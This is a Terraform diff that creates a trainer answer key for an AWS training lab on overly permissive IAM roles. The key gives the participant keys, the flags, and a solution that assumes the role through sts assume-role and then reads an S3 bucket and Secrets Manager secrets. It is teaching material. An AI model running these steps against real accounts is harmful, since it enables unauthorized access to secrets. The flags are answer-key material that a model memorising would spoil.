@@ -208,3 +208,45 @@ resource "local_file" "participant_credentials" {
     ================================================================
   EOT
 }
+
+###############################################################################
+# Trainer answer key - everything needed to run/verify/demo the lab.
+###############################################################################
+
+resource "local_file" "trainer_notes" {
+  filename        = "${path.module}/trainer_notes.txt"
+  file_permission = "0600"
+  content         = <<-EOT
+    ================================================================
+     AWS Security Lab - Overly permissive IAM policies
+     TRAINER notes / answer key  (do NOT give to participants)
+    ================================================================
+
+    Region                : ${data.aws_region.current.name}
+    Account               : ${data.aws_caller_identity.current.account_id}
+
+    Overly-permissive role: ${aws_iam_role.overly_permissive.arn}
+    Flag bucket           : ${aws_s3_bucket.flag.id}
+    In-scope secret       : ${aws_secretsmanager_secret.in_scope.name}
+    Decoy secret          : ${aws_secretsmanager_secret.decoy.name}
+
+    Participant credentials (also in participant_credentials.txt):
+      AWS_ACCESS_KEY_ID     = ${aws_iam_access_key.participant.id}
+      AWS_SECRET_ACCESS_KEY = ${aws_iam_access_key.participant.secret}
+
+    Flags:
+      Bucket : FLAG{s3_bucket_read_via_overly_permissive_role}
+      Secret : FLAG{secrets_manager_scoped_read_peachycloud_sec}
+
+    Solution (as the participant):
+      export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_DEFAULT_REGION=${data.aws_region.current.name}
+      aws s3 ls                       # denied (no direct perms)
+      CREDS=$(aws sts assume-role --role-arn ${aws_iam_role.overly_permissive.arn} \
+              --role-session-name demo --query Credentials --output json)
+      # export the returned temp creds, then:
+      aws s3 cp s3://${aws_s3_bucket.flag.id}/flag.txt -
+      aws secretsmanager get-secret-value --secret-id ${aws_secretsmanager_secret.in_scope.name} --query SecretString --output text
+      aws secretsmanager get-secret-value --secret-id ${aws_secretsmanager_secret.decoy.name} --query SecretString --output text   # denied (scoping)
+    ================================================================
+  EOT
+}
